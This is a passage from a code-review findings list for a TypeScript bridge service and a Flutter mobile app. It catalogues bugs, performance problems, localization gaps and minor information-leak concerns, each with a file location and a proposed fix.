  Node fs 错误含完整绝对路径，攻击者可据此枚举白名单外的目录结构。file-browser-manager.ts 的 normalizeError 已是正确范式，应统一为稳定 errorCode + 详情仅入日志。
- `A-7` **[perf]** `packages/bridge/src/websocket.ts:11068` — permission_request/result FCM branches skip hasExplicitPushSubscriber check
  Only the progress branch checks for explicit subscribers; permission_request and result send N per-locale notify calls even when no token subscribes to the event, delegating all filtering to CF and burning the CF rate-limit quota for nothing.
- `B-23` **[logic]** `packages/bridge/src/websocket.ts:11242` — conversation-content 变更信号依赖 catalog-watch 客户端存在
  monitor 启停条件是"存在声明 session_catalog_changed_v1 且 interactive 的客户端"。若某客户端只声明 conversation_content_event_v1，monitor 被关闭，推送只能靠 45s~5min 冷扫兜底且无任何提示。

### Mobile

- `A7` **[test-gap]** `apps/mobile/analysis_options.yaml:19` — Only Japanese hardcoded-string lint enabled; English/Chinese hardcoding undetected
  avoid_hardcoded_japanese is the sole hardcoded-copy lint, so the 132 hardcoded English literals found in the scan are invisible to static checks and the localization pass has no automated backstop.
- `D-5` **[logic]** `apps/mobile/lib/features/background_sync/background_notification_mode_controller.dart:515` — _handleNotification drops events arriving during fg/bg transition, unrecoverable
  The handler requires _isBackground == true, so a background_notification_v1 arriving in the foreground-to-background transition window is discarded with no compensation; the Bridge has already consumed its projection dedup state (permissionToolUsesBySession) and will not resend, so the boundary event is permanently lost.
- `H-12` **[logic]** `apps/mobile/lib/features/chat_session/state/chat_session_cubit.dart:284` — detachedPreview cubit 硬编码 ProcessStatus.idle 且跳过 _respondedToolUseIds 恢复
  正在 running 的会话在预览中显示 idle；缓存 history 中未响应的 approval 会渲染出审批 UI，而 approve/reject 已 guard 为 no-op → 用户点击没有任何反馈。
- `3.4-4` **[leak]** `apps/mobile/lib/features/chat_session/widgets/chat_message_list.dart` — _expandedCurrentProgress 与历史 segment 展开集合独立，旧 key 永不清理
  turn 结束、当前过程降级为历史 segment 后展开状态不迁移，用户展开的框自动收起；旧 key 仅在 collapse-all 时清空，长会话中单调增长。
- `U-2` **[logic]** `apps/mobile/lib/features/chat_session/widgets/chat_message_list.dart:645` — 相邻两行显示完全相同的重复时间戳
  ChatProcessDisclosure 时间取 segment.lastEntryIndex；segment 只有内联过程时 lastEntryIndex == assistantEntryIndex，同一时间同时显示在上方 assistant 操作栏和折叠行。
- `3.4-3` **[bug]** `apps/mobile/lib/features/chat_session/widgets/chat_message_list.dart:853` — streaming 分支 turnKey 回退到 'session:<id>'，turn 出现后 key 变化丢失展开状态
  回退链 `turn?.key ?? processLayout.latestTurnKey ?? 'session:<id>'`（:853-857），布局尚无 turn 时用 session: 身份；稍后 turn 出现则 key 变化，用户已展开的框自动收起。
- `U-3` **[logic]** `apps/mobile/lib/features/chat_session/widgets/chat_message_list.dart:1004` — 外层中间过程折叠行时间忽略更晚的 auxiliary entry
  取 intermediateSegments.last.lastEntryIndex，忽略后续可见更新与图片组，显示的时间可能比折叠内最新内容更旧。应取 intermediateEntryIndices 的最大 index。
- `U-7` **[bug]** `apps/mobile/lib/features/chat_session/widgets/chat_message_list.dart:1266` — 可访问性：八行框高度 clamp 1.6 但行内容继续放大；timestamp 字号 10 且 `~` 无 Semantics
  辅助字号下框内可见行数远少于 8；timestamp 固定 fontSize 10（用户气泡内还叠 alpha 0.66）对比度偏低；chat_message_timestamp.dart:594-603 的 `~` 前缀无 Semantics，VoiceOver 读作波浪号，"约"的含义不可达。
- `3.4-5` **[bug]** `apps/mobile/lib/features/chat_session/widgets/chat_message_list.dart:1276` — 八行框 Scrollbar 未设 thumbVisibility，无溢出提示；框水平 padding 为 0
  iOS 静止时滚动条不可见，等同于没有溢出提示，也无渐隐/"还有 N 项"暗示；框水平 padding 为 0（:1276-1281）使边框贴屏幕边缘，与消息气泡缩进体系不一致。
- `U-6` **[perf]** `apps/mobile/lib/features/chat_session/widgets/chat_message_list.dart:1300` — 八行框内部是 SingleChildScrollView + Column，非懒加载
  长 interval（几十上百条）展开时全部 build+layout，且每次 streaming/guardian setState 全量重建，外加 ClipRRect 一层裁剪。条目多时应换 ListView/SliverList，至少加 RepaintBoundary。
- `3.1-5` **[bug]** `apps/mobile/lib/features/chat_session/widgets/chat_message_list.dart:1409` — _HistoryToolDetailGapView 没有 ChatEntry，拿不到任何时间源
  按需加载的历史工具结果没有对应 ChatEntry，因此无法沿用 entry 时间，需要从 detail 响应自身取时间源。属第二条渲染路径，需单独设计。
- `U-4` **[logic]** `apps/mobile/lib/features/chat_session/widgets/chat_process_layout.dart:49` — ChatCurrentToolActivityLine 时间恒为工具开始时刻，冒充"最新状态时间"
  completed() 保留原 entryIndex，行文案已切到"最新工具/已完成"但时间仍是开始时刻。完成态应取该组最后一个可见事件的权威时间。
- `H-11` **[bug]** `apps/mobile/lib/features/claude_session/claude_session_screen.dart:229` — _loadingCachedPreview 防重入 guard 丢更新，预览停留在旧 revision
  load 在途时到达的 update 被跳过且不重排。若其为最后一次事件，预览永远停留在旧 revision。应置 dirty 标记并在 whenComplete 时重试。
- `H-7` **[logic]** `apps/mobile/lib/features/conversation_content_sync/conversation_content_sync_service.dart:156` — subscribe 握手期间的 focus 变更被静默丢弃且不回放
  _activeSubscriptionId == null 时只记录 _focused 不发送（:166 return），subscribed 到达后不比较差异补发。握手窗口内点开会话时，优先级提升永不生效。
- `H-10` **[perf]** `apps/mobile/lib/features/conversation_content_sync/conversation_content_sync_service.dart:225` — 离开 interactive 模式只 _stages.clear() 保留订阅，恢复后整窗重建
  期间的 patch 全被丢弃；恢复后 _ensureSubscribed 因 _activeSubscriptionId != null 早退，下一个 patch 因 baseRevision 不匹配 → 删除整个本地窗口 + 重订阅全量重传。能自愈但代价是整窗重建。
- `H-8` **[compat]** `apps/mobile/lib/features/conversation_content_sync/conversation_content_sync_service.dart:298` — 客户端隐式假设 subscribed 的 subscriptionId == requestId，协议耦合未固化
  当前 Bridge（conversation-content-sync.ts:294）恰好如此。任一侧改为服务端独立分配 id，subscribed 会被顶部 guard 吞掉 → _pendingSubscriptionId 永不清除、无 error、无 retry，直到断线重连。两侧均无注释或契约测试固定该约定。
- `H-9` **[bug]** `apps/mobile/lib/features/conversation_content_sync/conversation_content_sync_service.dart:479` — error 事件只处理 pending subscribe，作用于 active subscription 的错误被完全忽略
  针对活动订阅的错误既不重订阅也不上报，订阅可能静默停摆而 UI 无任何提示。应在 error 无 requestId 匹配但 subscriptionId 为 active 时执行带退避的 restart。
- `A9` **[l10n]** `apps/mobile/lib/features/debug/debug_screen.dart:67` — Debug screen strings hardcoded English on a release-reachable page
  'Force support prompts' and its subtitle are hardcoded; since the debug screen is reachable in release builds (see B4/E4), this is user-visible copy, not developer-only.
- `12/E-8` **[bug]** `apps/mobile/lib/features/explore/state/explore_cubit.dart:108` — close() does not await subscription cancel; emits lack isClosed guards
  _fileListSub?.cancel() is not awaited (unlike session_archive_cubit which awaits) and _applyFiles/openDirectory/goUp emit without isClosed checks. Broadcast-stream cancel is synchronous so current risk is low, but this is the standard setup for 'Cannot emit after close' regressions.
- `16/E-9` **[logic]** `apps/mobile/lib/features/explore/state/explore_cubit.dart:167` — normalizeExplorePath silently walks up to root; O(depth x n); empty dirs inexpressible
  When restoring initialPath whose directory is invisible due to list truncation, the loop silently climbs parents and finally returns '' (root) with no user notice, and each level does an O(files) linear scan. buildExploreEntries derives directories only from file paths, so genuinely empty, fully-filtered, or symlinked directories cannot be represented at all.
- `D15` **[perf]** `apps/mobile/lib/features/file_browser/file_browser_screen.dart:71` — _scheduleServiceSync does full setState rebuild on every service notification
  Each service notification triggers setState(() {}) rebuilding the entire file list, with no diffing or scoping to changed entries.
- `C-17/C27` **[perf]** `apps/mobile/lib/features/file_transfer/file_transfer_http.dart:53` — authoritativeOffset collected but never read; mismatch pays full re-prepare
  The server's authoritative offset is packed into the exception at :322-337 but no code in the repo reads it; upload_offset_mismatch is judged recoverable and goes through a complete re-prepare instead of resuming directly at the known-good offset.
- `C-15/C25` **[logic]** `apps/mobile/lib/features/file_transfer/file_transfer_http.dart:302` — Progress semantics wrong: sink bytes counted, visible rewinds, no staging progress
  Upload progress reports bytes pushed into the request sink, not server-acknowledged bytes; downloadChunk's finally truncate(offset) makes UI progress visibly jump back on chunk failure; the potentially 15GiB stageExternalFile copy shows only a spinner; and _progress allocates checkpoint.copyWith + FileTransferRecord per socket chunk even when the 100ms throttle discards the update.
- `C-16/C26` **[leak]** `apps/mobile/lib/features/file_transfer/file_transfer_http.dart:455` — Cancellation listeners accumulate per chunk; ~15000 closures for a 15GiB file
  Every downloadChunk/uploadChunk/_sendNoBody/_waitWithCancellation attaches an unremovable .then to the same work-level cancellation future, each capturing an abort Completer. At 1MiB minimum chunks a 15GiB transfer accumulates roughly 15000 resident closures with no way to unregister.
- `C-18` **[bug]** `apps/mobile/lib/features/file_transfer/file_transfer_service.dart:666` — cancelTransfer cleanup exception loses record: gone from UI, left on disk
  _pausedWork = null executes first; if the subsequent await _cleanupWork(paused) throws (unsafe_cleanup_target, Keychain failure), the following _remember(cancelled) and _notify never run, so the task vanishes from UI while its files remain on disk.
- `C-14` **[logic]** `apps/mobile/lib/features/file_transfer/file_transfer_service.dart:2236` — Auto-resume never works for auth-required uploads; error silently swallowed
  _resumePausedIfReady calls parameterless continuePaused(), and _authorizeUploadMutation throws mutation_auth_required when authorizeMutation is null; the error is swallowed by _launch's catchError, so it fails again on every reconnect with no UI feedback and no hint that manual resume is needed.
- `C28/D-10` **[bug]** `apps/mobile/lib/features/file_transfer/file_transfer_service.dart:2648` — _notify({force}) ignores its force parameter; 30+ force:true call sites are no-ops
  _notify completely ignores the force flag, so every call site passing force:true gets identical throttled behavior. UI updates that were meant to be immediate are silently deferred or dropped.
- `10/D14` **[bug]** `apps/mobile/lib/features/gallery/widgets/gallery_image_viewer.dart:36` — Post-delete PageController not synced; viewer holds one-time snapshot of images
  Deletion only updates the currentPage hook value without pageController.jumpToPage, relying on PageView clamping (onPageChanged not fired). imageList is a snapshot copied from images, so GalleryNewImageMessage or external deletions never reach the open viewer.
- **[bug]** `apps/mobile/lib/features/gallery/widgets/gallery_image_viewer.dart:64` — handleDelete captures build-time safeIndex/currentImage; stale-index delete window
  handleDelete closes over safeIndex and currentImage computed at build time, so if the underlying list changes before confirmation completes there is a theoretical window of deleting the wrong index (the modal dialog blocks most trigger paths, hence P3). Additionally the unmounted early-return leaves isDeleting.value stuck true, though the widget is already destroyed.
- `D-10` **[bug]** `apps/mobile/lib/features/gallery/widgets/gallery_image_viewer.dart:86` — Viewer delete updates hook page only; controller not jumped, list is stale snapshot
  After deletion only the hook's currentPage changes without pageController.jumpToPage, and imageList is a one-time snapshot of images, so external additions/deletions are not reflected while the viewer is open.
- `12/D-10/D12` **[perf]** `apps/mobile/lib/features/generated_image_preview/generated_image_preview_mapper.dart:47` — Item cache is FIFO not LRU with hardcoded capacity 64; cacheKey embeds full content
  Eviction removes the oldest inserted entry so sessions with >64 generated images thrash and degrade back to repeated base64 decoding (D1). The cacheKey record includes the entire message.content, making hashing/comparison cost proportional to content length.
- `13/D-10/D13` **[perf]** `apps/mobile/lib/features/generated_image_preview/widgets/generated_image_chat_group.dart:170` — didChangeDependencies unconditionally resolves image provider, forcing full decode
  Even when initState already got the aspect ratio via the cheap _pngAspectRatio() header read, didChangeDependencies calls _resolveAspectRatio() triggering provider.resolve and a complete decode; the stream-key short-circuit misses on the first resolve, so every theme/MediaQuery/keyboard change repeats listener churn.
- `18/D-18` **[logic]** `apps/mobile/lib/features/git/state/git_view_cache_service.dart:28` — Cubit cache keyed only by sessionId; stale projectPath cubit returned after path change
  getOrCreate returns any existing cubit for the sessionId, ignoring the passed projectPath/worktreePath, while GitViewCubit._projectPath is final. When a session later switches to a worktree (or back), the Git panel keeps sending get_diff/git_stage against the old path.
- `14/D-10` **[bug]** `apps/mobile/lib/features/message_images/message_images_screen.dart:165` — images! relies on implicit state contract; onError pastes raw exception into UI
  final imageList = images! depends on the unstated invariant loading==false && error==null implies images!=null. onError only special-cases TimeoutException; any other exception (e.g. StateError from a closed bridge stream) is stringified directly into the user-facing error text.
- `B9` **[l10n]** `apps/mobile/lib/features/mobile_update/mobile_update_screen.dart:127` — Raw Shorebird SDK exception strings rendered directly to the user
  state.failureDetail is the raw English exception text, conflicting with the fixed-copy localization requirement and potentially containing internal URLs/file paths. In release show only the localized failure(kind) and fold detail behind a disclosure or logs.
- `E6` **[bug]** `apps/mobile/lib/features/mobile_update/mobile_update_settings_tile.dart:39` — MobileUpdateScreen opened via Navigator.push, bypassing auto_route
  The MaterialPageRoute push gives the screen no route name, so SessionRouteObserver treats it as a no-sessionId route and triggers clearActiveSession (aggravating E3), and the screen is not deep-linkable or observable in the route stack. Add @RoutePage and register it.
- `15/E-13` **[logic]** `apps/mobile/lib/features/session_archive/session_archive_cubit.dart:98` — refresh() returns false while in-flight; RefreshIndicator collapses with no feedback
  When not supported or already loading, refresh() returns Future.value(false), so RefreshIndicator's onRefresh resolves instantly and the spinner collapses as if refresh completed; the AppBar refresh button similarly gives no feedback. It should return the in-flight request's future instead.
- `13/E-16` **[bug]** `apps/mobile/lib/features/session_insights/state/session_insights_controller.dart:148` — _onSessionMessage lacks _disposed guard before notifyListeners
  dispose() does not await _sessionSubscription cancel and all four _onSessionMessage branches call notifyListeners() with no _disposed check, unlike _minuteTimer and _clearLoading which do guard. A message delivered after dispose hits the disposed-ChangeNotifier assertion.
- `14/E-3` **[bug]** `apps/mobile/lib/features/session_link/state/session_link_cubit.dart:85` — _resumeGitBranch assigned after await; early session_created loses branch name
  The subscription is set up before `await _resumeCoordinator.resume(...)` but _resumeGitBranch = dispatch.gitBranch is assigned after it; if session_created arrives first, _handleResumeMessage builds openResumed with gitBranch:null and the route loses the branch (screen:64-77). Assign from RecentSession before subscribing.
- `H-13` **[bug]** `apps/mobile/lib/features/session_list/data/session_catalog_cache_repository.dart:536` — close() 只 await 当前 _mutationTail，期间入队的 mutation 在 DB close 后执行报 StateError
  await 期间新入队的 mutation 会在数据库已关闭后执行抛 StateError，service 层把它当普通失败触发重订阅。应在 close 时置 closed 标志拒绝新 mutation。
- `C-13` **[logic]** `apps/mobile/lib/features/session_list/session_list_screen.dart:1324` — 每会话 Claude 设置持久键 'claude_session_settings_$sessionId' 无 provider/Bridge 维度
  A5 残留漏口之二。不同 Bridge 或不同 provider 下相同 sessionId 的会话共用同一份持久化设置，互相覆盖。
- `C-9` **[bug]** `apps/mobile/lib/features/session_list/state/session_list_cubit.dart:36` — projectPath 用原始字符串比较，回显形式不一致时响应被静默丢弃
  SessionCatalogQuery.matches 与 bridge_service.dart:3454-3457 的 _recentSessionRequestScopeKey 用原始字符串比较，而同文件 :784-790 的 _normalizedProjectPath 处理了尾斜杠/反斜杠。尾斜杠差异即导致响应不匹配被丢弃，骨架屏悬挂。
- `C-11/C-12` **[logic]** `apps/mobile/lib/features/session_list/state/session_list_cubit.dart:582` — rename 乐观更新只按 raw sessionId 匹配，无 provider/projectPath 维度
  `if (s.sessionId == sessionId)` 缺少 provider 与 projectPath 维度（A5 残留漏口之一）。Claude/Codex 或两个 Home 使用相同 raw session ID 时会串线改到错误的会话名。
- `C-16` **[perf]** `apps/mobile/lib/features/session_list/widgets/home_content.dart:459` — 外层 ListenableBuilder 合并监听，任一通知触发全量投影重建
  合并监听 NotificationService/FileTransferService/shell，任一通知都走 _buildContent：全量重建 catalogSessions（mirror 元数据映射 + 全字段 lowercase 过滤）+ buildUnifiedSessionList 全列表建 map、排序（session_list_projection.dart:64-125）。千级目录 + 高频广播时主线程负载明显。
- `M-14` **[bug]** `apps/mobile/lib/features/settings/cache_management_screen.dart:121` — 目录缓存计数只在进入页面和清理后刷新，页面停留期间不更新
  backend 监听的是 mirror service，不含 catalog 仓库；后台同步继续写入 entries 时计数不变，也无下拉刷新，用户看到的是过期数字。
- `M-11` **[bug]** `apps/mobile/lib/features/settings/cache_management_screen.dart:198` — _showError 把原始异常字符串（含路径/SQL 细节）直接展示给最终用户
  内部实现细节泄漏到 UI，既不可读也有信息泄露风险。应映射为友好文案、细节进日志。
- `M-8` **[logic]** `apps/mobile/lib/features/settings/cache_management_screen.dart:311` — 空间统计偏小且口径未标注
  metadata.bytes 是协议 JSON payload 字节（模型注释明确"不含 SQLite 页开销"），UI 直接当占用展示；目录缓存侧完全无字节统计。用户据此判断清理收益会被误导。
- `M-13` **[l10n]** `apps/mobile/lib/features/settings/cache_management_strings.dart:59` — cache_management_strings 绕开 ARB 手写四语言，含死字符串与平台假设
  clearing 字符串定义后从未使用（死代码）；多处硬编码 "Mac/电脑" 但 Bridge 可运行于 Linux/Windows；整个文件绕开 ARB/AppLocalizations 体系，与 settings 其余部分不一致，新增语言时会漏。
- `A-10` **[logic]** `apps/mobile/lib/features/side_chat/state/side_chat_controller.dart:665` — Unreachable disposed-branch in _onConnectionState; cleanup relies on 12s timer fallback
  dispose() cancels _connectionSubscription before setting _disposed=true, so the `if (_disposed)` branch calling _finishDisposeCleanup on disconnect can never run; cleanup depends entirely on the 12s Timer at line 755. Harmless but misleading dead code.
- `B-6` **[bug]** `apps/mobile/lib/features/subagents/state/subagents_controller.dart:70` — Refresh during in-flight history request is a silent no-op with an enabled button
  refresh() sets _pendingRefresh=true and returns without notifyListeners or listLoading, while the button's disabled condition is listLoading only; tapping refresh mid-history-fetch gives zero visual feedback and looks broken.
- `E-19` **[bug]** `apps/mobile/lib/features/subagents/state/subagents_controller.dart:82` — Timeouts uniformly mapped to 'unsupported'; _normalizedError masks real causes
  Both list and history timeouts set errors to 'unsupported' (misreporting slowness as missing Bridge capability, see B-3), and _normalizedError (292-300) folds any server message containing 'unsupported' into the same bucket, hiding the actual failure reason. Use a distinct 'timeout' code.
- **[l10n]** `apps/mobile/lib/l10n/app_zh.arb:104` — 12 zh ARB values still English (machineEdit* group); reasoning/webSearch lag ko
  The machine-edit field labels (machineEditPort/SshUsername/SshPort/PrivateKey/JumpHost/JumpPort/JumpUsername/JumpPassword etc.), effort, and supporterTitle remain English in zh (and mostly ja), while 'reasoning' and 'webSearch' are already translated in ko but not zh/ja, a clear inconsistency. The other 29 English-looking values (commands, paths, brands, shortcuts) are correctly kept verbatim.
- `B10` **[perf]** `apps/mobile/lib/main.dart:158` — mobileUpdateService.initialize() awaited on the synchronous startup path
  initialize() serially awaits secure-storage reads plus two Shorebird platform-channel calls in main(); Keychain can be slow right after device unlock, delaying launch. The idempotent _initialization ??= mechanism already exists, so this can be unawaited and lazily driven by the tile/screen.
- `A-9` **[bug]** `apps/mobile/lib/main.dart:201` — Externally-constructed registry passed to ChangeNotifierProvider(create:) — double ownership
  ephemeralSideChatRegistry is built in main() then injected via create:, so Provider disposal will dispose() an object it does not own; under hot restart or tests the disposed registry keeps being used. Switch to ChangeNotifierProvider.value.
- `B8` **[perf]** `apps/mobile/lib/main.dart:582` — checkInBackground on every resume with no failure backoff
  _lastCheckedAtKey is only written after a successful _gateway.check(), so during persistent failures (offline/server down) every foreground transition retries the network request with zero backoff. Record failure timestamps with a cooldown.
- `E5` **[bug]** `apps/mobile/lib/mock/mock_scenarios.dart:181` — Real developer machine paths hardcoded in mock data shipped in release
  Five occurrences of /Users/k9i-mini/Workspace/ccpocket/... ship with release builds (given E4), exposing the maintainer's macOS username and directory layout; mock_sessions.dart correctly uses /Users/demo. Replace uniformly.
- `M-4` **[logic]** `apps/mobile/lib/models/conversation_mirror_models.dart:68` — Mirror metadata 无 title/summary，_displayName 按路径末段猜标题
  猜不到则截断 providerSessionId 展示。而 durable catalog（session_catalog_cache 的 session_json 里存有 RecentSession.name）与该列表完全没有关联，用户在缓存管理页看到的是无意义的 id 片段。
- **[perf]** `apps/mobile/lib/models/local_features/protocol_host.dart:145` — describeRequest does jsonDecode(toJson()) roundtrip per message; silent descriptor skip
  Every ephemeral message pays a serialize/deserialize roundtrip just to read type (ClientMessage.type getter exists at messages.dart:4854), and invalid descriptors are silently continue-skipped letting a later slot steal the request — silent misrouting instead of explicit failure.
- **[logic]** `apps/mobile/lib/models/local_features/slots/codex_core_actions_protocol_slot.dart:93` — Validation deferred to toJson(); const targets constructible then throw at send
  const CodexReviewCommitTarget('') constructs legally and only throws ArgumentError at send time, far from the root cause; :115 also sends explicit 'title': null, which zod .optional() Bridges reject. Fix: validate in factory constructors; omit key instead of null.
- **[bug]** `apps/mobile/lib/models/local_features/slots/conversation_mirror_protocol_slot.dart:518` — All-or-nothing deletes list drops whole patch and desyncs revision
  One invalid element (empty string, non-String) discards the entire patch (also content:225-232), leaving the mirror out of sync with the remote revision and requiring a full re-pull. Fix: filter invalid items with warning; reject only on revision/baseRevision inconsistency.
- **[logic]** `apps/mobile/lib/models/local_features/slots/ephemeral_side_chat_protocol_slot.dart:37` — Registry request uses pseudo session id; response sessionId null — never match
  Requests use 'ephemeral-side-chat-registry' as ownerSessionId but EphemeralSideChatRegistryMessage.sessionId is null, so localFeatureMessagesForSession (bridge_service.dart:4854-4860) never matches any subscriber; only the global stream works, inconsistent with other slots and easy to misuse. Fix: return the same pseudo session id in the message.
- `P3-3` **[logic]** `apps/mobile/lib/models/local_features/slots/file_browser_protocol_slot.dart:145` — Error attribution via exact English message text and substring regex
  Matching requires error.message to equal 'File browser capability was not negotiated' verbatim, breaking on any server wording change or localization; conversely message.contains(requestType) can misattribute an unrelated error mentioning the requestType and prematurely complete a pending request. Attribution should rely on errorCode and structured requestId.
- `P3-7` **[logic]** `apps/mobile/lib/models/local_features/slots/file_browser_protocol_slot.dart:333` — Upload size cap validated against download constant; duplicated limits
  FileMutationOperation.toJson validates upload size with maxFileBrowserDownloadBytes while prepareFileTransferUpload uses maxFileTransferBytes; both are 15GB only by coincidence and live in different files. Adjusting either produces 'auth challenge passed but upload rejected' inconsistency.
- `P3-5` **[compat]** `apps/mobile/lib/models/local_features/slots/file_browser_protocol_slot.dart:575` — Path uniqueness and cache keys use exact strings, no Unicode normalization
  Duplicate detection compares raw relativePath strings and validation does no NFC/NFD normalization. Mixing macOS APFS (NFD) with NFC sources means the same file's two representations neither dedupe nor hit local cache keys.
- `P3-6` **[compat]** `apps/mobile/lib/models/local_features/slots/file_browser_protocol_slot.dart:621` — Stat item requires node.relativePath to exactly equal outer relativePath
  If the server normalizes paths (strip trailing slash, resolve '.', case-fold) and returns the canonical form, the strict equality check throws 'stat node path mismatch' and the entire stat batch fails. Compare normalized forms or trust the node's value.
- `P3-4` **[logic]** `apps/mobile/lib/models/local_features/slots/file_browser_protocol_slot.dart:1262` — Validates trim().isEmpty but returns the untrimmed original value
  Text fields (label, displayPath, filename, mimeType) allow leading/trailing whitespace while identifier fields require trim()==value, an inconsistent contract. A trailing-space filename flowing into the download save path can behave differently across platforms.
- `P3-8` **[logic]** `apps/mobile/lib/models/local_features/slots/file_transfer_protocol_slot.dart:36` — v2/v3 decided by re-comparing json['type'] string inside fromJson
  includesSavedPath is derived from json['type'] == 'file_transfer_upload_result_v3'; any alias/case difference silently takes the v2 branch nulling savedPath (or throws via the exact-keys whitelist first, behavior depending on which triggers). Version should be passed explicitly from the slot's tryDecode.
- `P3-1` **[logic]** `apps/mobile/lib/models/local_features/slots/file_transfer_protocol_slot.dart:94` — Cancel direction wire encoding asymmetric: literals in, enum .name out
  Inbound switches on 'upload'/'download' literals while outbound emits direction.name; an enum rename (silently done by refactor tools) breaks the wire protocol without compile-time warning. FileBrowserNodeKind/FileMutationAuthEvent use explicit wireValue; FileTransferCancelDirection should too.
- **[logic]** `apps/mobile/lib/models/local_features/slots/session_insights_models_slot.dart:50` — totalTokens fallback input+output omits cached/reasoning tokens
  ContextUsage.utilization divides last.totalTokens by modelContextWindow, so when Bridge omits totalTokens the context usage is systematically underestimated (Codex reasoning tokens can dominate). Fix: include reasoning in the fallback or document the metric and mark estimates.
- **[bug]** `apps/mobile/lib/models/local_features/slots/session_insights_models_slot.dart:108` — num.toInt() without isFinite; NaN/Infinity throws UnsupportedError
  double.nan.toInt() throws UnsupportedError (not FormatException), inconsistent with session_insights_protocol_slot.dart:491 which checks isFinite; mirror's raw.toInt() != raw (:568) also throws on NaN first. Standard JSON cannot produce NaN, hence P3, but non-JSON paths (internal Maps, lenient parsers) trigger it.
- **[logic]** `apps/mobile/lib/models/local_features/slots/session_insights_protocol_slot.dart:246` — fiveHour ?? primary fallback dead when fiveHour is non-Map
  When fiveHour exists but is false/0/"n/a", ?? does not fall back so _sessionUsageStringKeyedMap returns null and primary's valid data is silently ignored. Fix: apply the map coercion to each operand before ??.
- **[logic]** `apps/mobile/lib/models/local_features/slots/session_insights_protocol_slot.dart:341` — Case-sensitive 'available' string enum; magic clamp; count/list can contradict
  status=='available' is a case-sensitive bare-string enum with no unknown handling; reported.clamp(0, 1<<31) is a magic bound and availableCount can contradict the credits list with no consistency check.
- **[logic]** `apps/mobile/lib/models/local_features/slots/session_insights_protocol_slot.dart:365` — clamp(0, 1<<31) magic bound; availableCount can contradict credits list
  The reported count is clamped to an arbitrary bound and never cross-checked against the credits list (backend says 5, list has 2 available) with no consistency logging. Fix: min(reported, actual available) or log the mismatch.
- **[perf]** `apps/mobile/lib/models/local_features/slots/side_chat_protocol_slot.dart` — No model class in the 10 slot files implements ==/hashCode
  SideChatEventMessage, EphemeralSideChatEntry, SubagentInfo, CodexMcpServerStatus, AutoApprovalStateMessage etc. compare by reference, so Bloc states or stream.distinct() never dedupe, forcing full rebuilds on every poll (registry/list messages worst). Never-equal means redundant rebuilds not stale UI, hence P3; registry models deserve value equality first.
- **[logic]** `apps/mobile/lib/models/local_features/slots/side_chat_protocol_slot.dart:80` — Capability-degrade detection via exact English error text / regex heuristics
  side_chat compares error.message == 'Side chat capability was not negotiated' (one wording change breaks it, requests then hang to TTL); continuity (:71-81) regex-guesses unknown|unsupported|not supported and can falsely terminate an unrelated pending request. Fix: errorCode as sole determinant (unsupported_capability + structured capability field), text match only as sunset fallback.
- **[leak]** `apps/mobile/lib/models/local_features/slots/side_chat_protocol_slot.dart:160` — SideChatPermissionRequest.input mutable; questions inner Maps shallow-immutable
  input is a mutable Map.from copy and questions is List.unmodifiable over mutable inner maps (also codex_core_actions:320); request_user_input already writes question['options'] in place, proving mutation happens. Fix: deep Map.unmodifiable or freezed.
- **[logic]** `apps/mobile/lib/models/local_features/slots/subagents_models_slot.dart:50` — totalTokens fallback omits cached and reasoning tokens, underestimating context
  The input+output fallback excludes cachedInputTokens and reasoningOutputTokens while ContextUsage.utilization divides totalTokens by the context window, systematically underestimating context usage in Codex reasoning scenarios.
- **[bug]** `apps/mobile/lib/models/local_features/slots/subagents_models_slot.dart:108` — value.toInt() without isFinite; NaN/Infinity throws UnsupportedError
  NaN/Infinity from non-JSON paths throw UnsupportedError (outside format-error semantics); session_insights_protocol_slot.dart:491 has the isFinite guard, so the two are inconsistent.
- **[logic]** `apps/mobile/lib/models/local_features/slots/subagents_protocol_slot.dart:138` — Missing threadId becomes '' sentinel then silently filtered out
  SubagentInfo.fromJson defaults missing threadId to '' and the slot filters .where((a) => a.threadId.isNotEmpty) — double-layer hidden data loss with no log or count. Fix: return null at parse and count drops.
- `C-15/F03/F6` **[logic]** `apps/mobile/lib/models/messages.dart:113` — ProcessStatus unknown → idle as consumed by session models
  New paused/waiting_input states display as idle and the UI allows sending input to a busy session — permissive-direction fallback risk.
- `F4` **[logic]** `apps/mobile/lib/models/messages.dart:426` — on-failure approval policy hard-mapped to on-request — silent config drift
  Mapping direction is tightening (safe) but UI shows the wrong policy and 'modify and save' silently rewrites the Bridge's on-failure into on-request.
- `G-6/G06` **[logic]** `apps/mobile/lib/models/messages.dart:919` — Expando-based ServerMessageTimestamp lost when HistoryMessage is rebuilt
  bridge_service.dart:1515-1533 rebuilds HistoryMessage objects, and the new instances lose their Expando timestamp entry, falling back to DateTime.now(). Currently no visible harm since HistoryMessage timestamps aren't rendered, but the side-channel design is fragile.
- `F-2` **[bug]** `apps/mobile/lib/models/messages.dart:959` — Non-String type: host returns null, then fromJson casts type as String and throws
  tryDecode returns null for non-String type (protocol_host:129-131) and messages.dart:959's json['type'] as String immediately throws TypeError, so type-less malformed frames become Parse error bubbles instead of hitting the existing :1665 'Unknown message type' degradation branch. Fix: normalize non-String type to '' at the fromJson entry.
- `G-7` **[logic]** `apps/mobile/lib/models/messages.dart:1558` — Duplicated sizeLabel, identical unarchive/delete branches, possibly dead fields
  sizeLabel exists twice verbatim; unarchive_result and delete_session_result branch bodies are identical; clearContext/tipCode/ToolSuggestionApp parses may have no consumers.
- `F05/G-1` **[logic]** `apps/mobile/lib/models/messages.dart:1665` — Unknown message types render as red error bubbles inside the conversation
  The _ => ErrorMessage fallback surfaces unknown types as red error bubbles (chat_session_cubit.dart:1672,3127); supportedServerMessages negotiation misses new types replayed from history. Fix: a dedicated ignored-unknown sentinel type the UI skips silently.
- `G-4` **[logic]** `apps/mobile/lib/models/messages.dart:2037` — Defensive posture wildly inconsistent across handwritten fromJson
  Ranges from exemplary (HistoryToolDetailGap: caps, dedup, distrust of wire counts) to bare (WindowInfo, DiffImageChange), with generated machine.g.dart different again; propose mandatory parse primitives (_str/_int/_num/_map/_list/_instant) banning bare `as`.
- `E-3` **[perf]** `apps/mobile/lib/models/messages.dart:2270` — Approval-review regex full-scans arbitrarily large error text
  ([\s\S]+)$ over a multi-MB Bridge error message does a full scan; backtracking is linear (no ReDoS) but a length precheck (~4096) is advised.
- **[bug]** `apps/mobile/lib/models/messages.dart:2547` — app.cast<String, dynamic>() is a lazy Map view deferring type errors
  Map.cast is lazy like List.cast; wrong value types throw at access time rather than parse time (still present, currently at line ~2570 in ToolSuggestionApp parsing). Not among the 8 list-cast sites fixed by P0-7.
